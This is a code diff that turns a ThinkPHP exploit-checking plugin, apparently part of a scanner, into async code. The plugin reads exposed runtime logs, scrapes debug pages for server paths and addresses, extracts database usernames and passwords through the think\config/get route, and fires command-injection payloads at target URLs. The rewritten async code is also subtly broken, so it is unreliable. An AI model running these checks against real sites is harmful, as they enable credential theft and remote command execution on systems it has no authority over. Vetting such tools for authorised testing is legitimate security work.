@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 
+import asyncio
 import datetime
 import dateutil.relativedelta
 from bs4 import BeautifulSoup
-from app.lib.utils.request import request
-from app.lib.utils.common import get_capta, get_useragent
+from app.lib.request import request
+from app.lib.common import get_capta, get_useragent
 
 class Thinkphp_Rce_Collection_BaseVerify:
     def __init__(self, url):
@@ -62,7 +63,7 @@ class Thinkphp_Rce_Collection_BaseVerify:
         }
         self.item_list = [self.item1, self.item2, self.item3, self.item4]
 
-    def log_find(self):
+    async def log_find(self):
         
         """
         检测日志文件路径
@@ -87,14 +88,14 @@ class Thinkphp_Rce_Collection_BaseVerify:
             # sql日志 sql
             log_dir_sql_5 = self.url + "/../runtime/log/{}_sql.log".format(time_dir_5)
             try:
-                info_res = request.get(url = log_dir_info_5, headers = self.headers)
-                error_res = request.get(url = log_dir_error_5, headers = self.headers)
-                sql_res = request.get(url = log_dir_sql_5, headers = self.headers)
-                if info_res.status_code == 200 and (("[ info ]" in info_res.text) or ("[ sql ]" in info_res.text) or ("[ error ]" in info_res.text)):
+                info_res = await request.get(url = log_dir_info_5, headers = self.headers)
+                error_res = await request.get(url = log_dir_error_5, headers = self.headers)
+                sql_res = await request.get(url = log_dir_sql_5, headers = self.headers)
+                if info_res.status == 200 and (("[ info ]" in await info_res.text()) or ("[ sql ]" in await info_res.text()) or ("[ error ]" in await info_res.text())):
                     result.append(log_dir_info_5) 
-                if error_res.status_code == 200 and (("[ info ]" in error_res.text) or ("[ sql ]" in error_res.text) or ("[ error ]" in error_res.text)):
+                if error_res.status == 200 and (("[ info ]" in await error_res.text()) or ("[ sql ]" in await error_res.text()) or ("[ error ]" in await error_res.text())):
                     result.append(log_dir_error_5)
-                if sql_res.status_code == 200 and (("[ info ]" in sql_res.text) or ("[ sql ]" in sql_res.text) or ("[ error ]" in sql_res.text)):
+                if sql_res.status == 200 and (("[ info ]" in await sql_res.text()) or ("[ sql ]" in await sql_res.text()) or ("[ error ]" in await sql_res.text())):
                     result.append(log_dir_sql_5)
             except Exception as e:
                 # print(e)
@@ -113,21 +114,17 @@ class Thinkphp_Rce_Collection_BaseVerify:
             log_dir_3 = [log_dir_3_1, log_dir_3_2, log_dir_3_3, log_dir_3_4, log_dir_3_5, log_dir_3_6]
             for log_path in log_dir_3:
                 try:
-                    log_3_res = request.get(url = log_path, headers = self.headers)
+                    log_3_res = await request.get(url = log_path, headers = self.headers)
                     log_3_res.encoding = 'utf-8'
-                    if log_3_res.status_code == 200 and (("INFO:" in log_3_res.text) or ("SQL语句" in log_3_res.text) or ("ERR:" in log_3_res.text)):
+                    if log_3_res.status == 200 and (("INFO:" in await log_3_res.text()) or ("SQL语句" in await log_3_res.text()) or ("ERR:" in await log_3_res.text())):
                         result.append(log_path)
-                    else:
-                        pass
                 except Exception as e:
                     # print(e)
                     pass
-                finally:
-                    pass
-        
+
         return result
 
-    def check_dubug(self):
+    async def check_dubug(self):
         
         """
         检测thinkphp调试模式是否打开
@@ -144,43 +141,39 @@ class Thinkphp_Rce_Collection_BaseVerify:
         url_debug = ["indx.php", "/index.php/?s=index/inex/"]
         for path in url_debug:
             try:
-                req_debug = request.get(url = self.url + path, headers = self.headers, timeout=5)
+                req_debug = await request.get(url = self.url + path, headers = self.headers, timeout=5)
                 req_debug.encoding = 'utf-8'
-                # print(req_debug.text)
-                if ("Environment Variables" in req_debug.text) or ("错误位置" in req_debug.text):
+                if ("Environment Variables" in await req_debug.text()) or ("错误位置" in await req_debug.text()):
                     debug_bool = True
                     result.append("Debug 模式已开启!")
-                    res_debug_html = BeautifulSoup(req_debug.text, 'html.parser')
+                    res_debug_html = BeautifulSoup(await req_debug.text(), 'html.parser')
                     div_html_5 = res_debug_html.findAll('div', {'class': 'clearfix'})
                     div_html_3 = res_debug_html.find('sup')
                     div_html_3_path = res_debug_html('div', {'class': 'text'})
                     result.append(div_html_5)
                     result.append(div_html_3)
                     result.append(div_html_3_path)
-                    break
+                    if div_html_5:
+                        for item in div_html_5:
+                            if item.strong.text == 'THINK_VERSION':
+                                result.append('THINK_VERSION: ' + item.small.text.strip())
+                            if item.strong.text == 'DOCUMENT_ROOT':
+                                result.append('DOCUMENT_ROOT: ' + item.small.text.strip())
+                            if item.strong.text == 'SERVER_ADDR':
+                                result.append('SERVER_ADDR: ' + item.small.text.strip())
+                            if item.strong.text == 'LOG_PATH':
+                                result.append('LOG_PATH: ' + item.small.text.strip())
+                            elif div_html_3 and div_html_3_path:
+                                result.append("ThinkPHP Version: " + div_html_3.text)
+                                result.append("ThinkPHP Path: " + div_html_3_path[0].p.text)
+                    return result
             except Exception as e:
                 # print(e)
                 pass
-            finally:
-                pass
-        if debug_bool == False:
-            print("Debug 模式未开启！")
-        if debug_bool:
-            if div_html_5:
-                for item in div_html_5:
-                    if item.strong.text == 'THINK_VERSION':
-                        result.append('THINK_VERSION: ' + item.small.text.strip())
-                    if item.strong.text == 'DOCUMENT_ROOT':
-                        result.append('DOCUMENT_ROOT: ' + item.small.text.strip())
-                    if item.strong.text == 'SERVER_ADDR':
-                        result.append('SERVER_ADDR: ' + item.small.text.strip())
-                    if item.strong.text == 'LOG_PATH':
-                        result.append('LOG_PATH: ' + item.small.text.strip())
-            elif div_html_3 and div_html_3_path:
-                result.append("ThinkPHP Version: " + div_html_3.text)
-                result.append("ThinkPHP Path: " + div_html_3_path[0].p.text)
 
-    def get_mysql_conf(self):
+        return result
+
+    async def get_mysql_conf(self):
         
         """
         尝试获取数据库配置
@@ -192,25 +185,54 @@ class Thinkphp_Rce_Collection_BaseVerify:
         
         result = []
         try:
-            name = request.get(url = self.url + "/?s=index/think\config/get&name=database.username", headers = self.headers)
-            hostname = request.get(url = self.url + "/?s=index/think\config/get&name=database.hostname", headers = self.headers)
-            password = request.get(url = self.url + "/?s=index/think\config/get&name=database.password", headers = self.headers)
-            database = request.get(url = self.url + "/?s=index/think\config/get&name=database.database", headers = self.headers)
-            if name.text and len(name.text) < 100:
-                result.append(name.text)
-            if hostname.text and len(hostname.text) < 100:
-                result.append(hostname.text)
-            if password.text and len(password.text) < 100:
-                result.append(password.text)
-            if database.text and len(database.text) < 100:
-                result.append(database.text)
+            name = await request.get(url = self.url + "/?s=index/think\config/get&name=database.username", headers = self.headers)
+            hostname = await request.get(url = self.url + "/?s=index/think\config/get&name=database.hostname", headers = self.headers)
+            password = await request.get(url = self.url + "/?s=index/think\config/get&name=database.password", headers = self.headers)
+            database = await request.get(url = self.url + "/?s=index/think\config/get&name=database.database", headers = self.headers)
+            if await name.text and len(await name.text()) < 100:
+                result.append(await name.text())
+            if await hostname.text and len(await hostname.text()) < 100:
+                result.append(await hostname.text())
+            if await password.text and len(await password.text()) < 100:
+                result.append(await password.text())
+            if await database.text and len(await database.text()) < 100:
+                result.append(await database.text())
             return result
         except Exception as e:
-            print(e)
+            # print(e)
+            pass
         finally:
             pass
+    
+    async def handle(self, method, url, data):
 
-    def check(self):
+        """
+        发送请求,判断内容
+
+        :param str url: 请求url
+        :param str data: 请求的数据
+
+        :return bool True or False: 是否存在漏洞
+        """
+
+        try:
+            if method == 'get':
+                check_req = await request.get(url + data, headers = self.headers)
+                if self.capta in await check_req.text() and ('windows' in await check_req.text() or 'linux' in await check_req.text()):
+                    if 'windows' in await check_req.text():
+                        self.osname = 'Windows'
+                    elif 'linux' in await check_req.text():
+                        self.osname = 'Linux'
+                    return True, data
+            else:
+                check_req = await request.post(url, headers = self.headers, data = data)
+                if self.capta in await check_req.text():
+                    return True, data
+        except Exception as e:
+            # print(e)
+            pass
+    
+    async def check(self):
     
         """
         检测是否存在漏洞
@@ -221,60 +243,36 @@ class Thinkphp_Rce_Collection_BaseVerify:
         """
         
         try:
+            tasks = []
             for item in self.item_list:
                 if item['method'] == 'get':
                     for payload in item['payloads']:
                         check_payload = payload.format(cmd = 'echo %swin^dowslin$1ux' %(self.capta))
-                        req = request.get(url = item['url'] + check_payload, headers = self.headers)
-                        if self.capta in req.text and ('windows' in req.text or 'linux' in req.text):
-                            if 'windows' in req.text:
-                                self.osname = 'Windows'
-                            elif 'linux' in req.text:
-                                self.osname = 'Linux'
-                            return True, payload
+                        task = asyncio.create_task(self.handle('get', item['url'], check_payload))
+                        tasks.append(task)
                 else:
                     for payload in item['payloads']:
                         check_payload = payload.format(cmd = 'echo %swin^dowslin$1ux' %(self.capta))
-                        req = request.post(url = item['url'], headers = self.headers, data = check_payload)
-                        if self.capta in req.text and ('windows' in req.text or 'linux' in req.text):
-                            if 'windows' in req.text:
-                                self.osname = 'Windows'
-                            elif 'linux' in req.text:
-                                self.osname = 'Linux'
-                            return True, payload, item['url']
-            return False
+                        task = asyncio.create_task(self.handle('post', item['url'], check_payload))
+                        tasks.append(task)
+
+            results = await asyncio.gather(*tasks)
+            for result in results:
+                if result:
+                    return True
+            
+            task = asyncio.create_task(self.log_find())
+            task = asyncio.create_task(self.check_dubug())
+            task = asyncio.create_task(self.get_mysql_conf())
+            results = await asyncio.gather(*tasks)
+            return_result = ''
+            for result in results:
+                if result:
+                    return_result = return_result + result
+            if return_result:
+                return True, return_result
         except Exception as e:
-            # print(e)
-            return False
-        finally:
-            pass
-    
-    def info(self):
-        
-        """
-        检测是否存在信息泄露
-
-        :param:
-
-        :return str result
-        """
-
-        try:
-            result = []
-            log_result = self.log_find()
-            if log_result:
-                result = result + log_result
-            debug_result = self.check_dubug()
-            if debug_result:
-                result = result + debug_result
-            mysql_result = self.get_mysql_conf()
-            if mysql_result:
-                result = result + mysql_result
-            return True, result
-        except Exception as e:
-            # print(e)
-            return False, e
-        finally:
+            print(e)
             pass
 
 if __name__ == "__main__":
